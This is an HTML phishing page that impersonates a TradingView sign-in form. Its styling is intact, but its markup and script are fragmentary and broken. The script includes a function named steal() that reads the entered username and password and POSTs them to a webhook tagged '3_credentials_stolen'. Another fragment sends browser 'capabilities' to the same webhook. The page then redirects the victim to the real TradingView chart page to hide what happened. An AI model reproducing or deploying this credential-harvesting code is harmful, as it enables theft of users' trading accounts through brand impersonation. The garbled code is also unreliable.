<!doctype html>
<html lang="en">
<head>

<title>TradingView — Symphony</title>
<style>
  body {
    margin: 0;
    padding: 20px;
    font-family: -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    background: #1e222d;
    color: #d1d4dc;
  }
  .container { max-width: 480px; margin: 40px auto; }
  .logo {
    display: flex; align-items: center; gap: 12px; margin-bottom: 24px;
  }
  .logo-icon {
    width: 32px; height: 32px; background: #2962ff; border-radius: 6px;
    display: flex; align-items: center; justify-content: center;
    color: white; font-weight: bold; font-size: 18px;
  }
  h1 { font-size: 18px; margin: 0; }
  .subtitle { color: #787b86; font-size: 13px; margin: 4px 0 24px; }
  form { background: #2a2e39; padding: 20px; border-radius: 8px; }
  label { display: block; font-size: 12px; color: #787b86; margin-bottom: 4px; }
  input {
    width: 100%; padding: 10px; margin-bottom: 12px;
    background: #1e222d; border: 1px solid #363a45; border-radius: 4px;
    color: #d1d4dc; font-size: 14px; box-sizing: border-box;
  }
  button {
    width: 100%; padding: 12px; background: #2962ff; color: white;
    border: none; border-radius: 4px; cursor: pointer; font-size: 14px;
  }
  button:hover { background: #1e53e5; }
  .footer { margin-top: 16px; font-size: 11px; color: #787b86; text-align: center; }
  .hidden { display: none; }
  #result { margin-top: 16px; padding: 12px; background: #26a69a; color: white; border-radius: 4px; }
</style>
</head>
<body>

  </div>

    <label for="password">Password</label>
    <input type="password" id="password" autocomplete="current-password" required>

    <button type="submit">Sign In</button>
  </form>

  <div id="result" class="hidden"></div>
  <p class="footer">TradingView, Inc. • Powered by Symphony</p>
</div>

  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(capabilities)
  }).catch(() => {});
}, 500);

// ============================================================
function steal(event) {
  event.preventDefault();
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;

  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      phase: '3_credentials_stolen',
      session: sessionId,

      timestamp: new Date().toISOString()

  setTimeout(() => {

      window.parent.location = 'https://www.tradingview.com/chart/';
    } catch (e) {
      window.location = 'https://www.tradingview.com/chart/';

}

</html>
